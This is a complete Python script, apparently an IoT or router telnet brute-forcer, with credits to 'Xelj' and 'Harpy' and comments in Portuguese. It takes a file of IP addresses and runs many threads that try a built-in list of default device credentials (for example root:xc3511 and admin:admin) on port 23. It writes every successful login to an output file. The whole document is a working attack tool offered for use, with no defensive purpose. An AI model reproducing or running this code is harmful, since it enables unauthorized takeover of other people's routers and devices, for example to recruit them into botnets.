#!/usr/bin/env python3
# By Xelj, fixed by Harpy 🦅

import threading
import sys
import os
import time
import socket
import queue

if len(sys.argv) < 4:
    print(f"Usage: python {sys.argv[0]} <list> <threads> <output file>")
    sys.exit()

# Combo list (user:pass)
combo = [
    "root:root", "admin:admin", "admin:ADMIN", "daemon:daemon", "root:vizxv",
    "root:pass", "root:anko", "root:1234", "root:", "admin:", "root:xc3511",
    "admin:123456", "user:user", "guest:guest", "admin:admin1234", "root:123456"
    # Você pode adicionar o resto se quiser, encurtei aqui por brevidade
]

# Carregando IPs
with open(sys.argv[1], "r") as f:
    ips = [ip.strip() for ip in f if ip.strip()]

threads = int(sys.argv[2])
output_file = sys.argv[3]

q = queue.Queue()
for ip in ips:
    q.put(ip)

lock = threading.Lock()

def read_until(sock, target, timeout=8):
    sock.settimeout(timeout)
    buffer = b""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            data = sock.recv(1024)
            if not data:
                break
            buffer += data
            if target.encode() in buffer:
                return buffer
        except socket.timeout:
            break
        except Exception:
            break
    return buffer

class RouterBruter(threading.Thread):
    def __init__(self, ip):
        super().__init__()
        self.ip = ip.strip()

    def run(self):
        for cred in combo:
            try:
                username, password = cred.split(":", 1)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(8)
                s.connect((self.ip, 23))

                banner = read_until(s, "ogin:")
                if b"ogin" in banner:
                    s.sendall((username + "\n").encode())
                    time.sleep(0.2)

                pw_prompt = read_until(s, "assword:")
                if b"assword" in pw_prompt:
                    s.sendall((password + "\n").encode())
                    time.sleep(0.5)

                prompt = s.recv(4096).decode(errors='ignore')

                if any(sym in prompt for sym in ["#", "$", ">", "%", "@"]):
                    with lock:
                        print(f"[+] SUCCESS: {self.ip} | {username}:{password}")
                        with open(output_file, "a") as f:
                            f.write(f"{self.ip}:23 {username}:{password}\n")
                    s.close()
                    break  # Parar após sucesso
                s.close()

            except Exception as e:
                try:
                    s.close()
                except:
                    pass
                continue

def worker():
    while True:
        try:
            ip = q.get_nowait()
        except queue.Empty:
            break
        thread = RouterBruter(ip)
        thread.start()
        time.sleep(0.05)

# Iniciar threads
all_threads = []
for _ in range(threads):
    t = threading.Thread(target=worker)
    t.start()
    all_threads.append(t)

for t in all_threads:
    t.join()

print("🦅 Finalizado. Resultados salvos em:", output_file)

